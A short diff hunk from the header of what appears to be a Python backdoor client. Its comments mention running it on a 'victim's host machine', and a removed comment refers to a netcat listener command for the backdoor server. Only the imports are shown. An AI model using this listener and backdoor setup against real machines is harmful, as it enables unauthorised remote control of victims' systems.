@@ -1,5 +1,6 @@
 #!/usr/bin/env python
-# setup listening in backdoor server nc -lvp 4444 if using netcat
+#This script should be run on the victim's host machine 
+
 import socket
 import subprocess
 import json
